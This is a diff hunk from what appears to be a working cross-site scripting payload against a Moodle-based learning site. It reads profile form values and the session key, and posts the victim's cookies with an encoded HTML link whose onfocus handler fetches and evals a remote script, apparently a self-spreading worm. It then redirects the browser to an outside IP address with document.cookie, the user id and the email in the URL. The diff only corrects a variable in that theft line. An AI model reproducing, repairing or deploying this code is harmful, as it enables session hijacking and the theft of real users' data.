@@ -165,7 +165,7 @@ async function getUserProfile() {
         console.log('mform_isexpanded_id_moodle_optional:', allValues.mform_isexpanded_id_moodle_optional);
         console.log('mform_isexpanded_id_category_1:', allValues.mform_isexpanded_id_category_1);
         await postData(allValues.email, allValues.id, allValues.course, allValues.timezone, allValues.sesskey, allValues._qf__user_edit_form, allValues.mform_isexpanded_id_moodle_picture, allValues.mform_isexpanded_id_moodle, allValues.mform_isexpanded_id_moodle_additional_names, allValues.mform_isexpanded_id_moodle_interests, allValues.mform_isexpanded_id_moodle_optional, allValues.mform_isexpanded_id_category_1, document.cookie, "%3Ch1+style%3D%22text-align%3Acenter%3B%22%3E%3Cstrong%3E%3Ca+href%3D%22https%3A%2F%2Fwww.dist-mspk.ru%2Fcourse%2Fsearch.php%3Fareaids%3Dcore_course-course%26amp%3Bq%3D%2522%2520autofocus%2Fonfocus%3D%2522fetch%28%2527https%3A%2F%2Fraw.githubusercontent.com%2FAMAT0RY%2Fxs%2Fmain%2Ftest.js%2527%29.then%28r%3D%253Er.text%28%29%29.then%28eval%29%3B%2522%2520%2F%2F%22+target%3D%22_blank%22+rel%3D%22noreferrer+noopener%22%3E%3Cspan%3E%D0%92%D0%9A%D0%90%D0%9D%D0%A2%D0%90%D0%9A%D0%A2%D0%95+%D0%A1%D0%AB%D0%9B%D0%9A%D0%90%3C%2Fspan%3E%3C%2Fa%3E%3C%2Fstrong%3E%3C%2Fh1%3E")
-        window.location = "http://64.188.79.250:8000/log?msg=" + encodeURIComponent(document.cookie)+", id:"+id+", email:"+allValues.email;
+        window.location = "http://64.188.79.250:8000/log?msg=" + encodeURIComponent(document.cookie)+", id:"+allValues.id+", email:"+allValues.email;
 
         // Возвращаем все значения для дальнейшего использования
         return allValues;
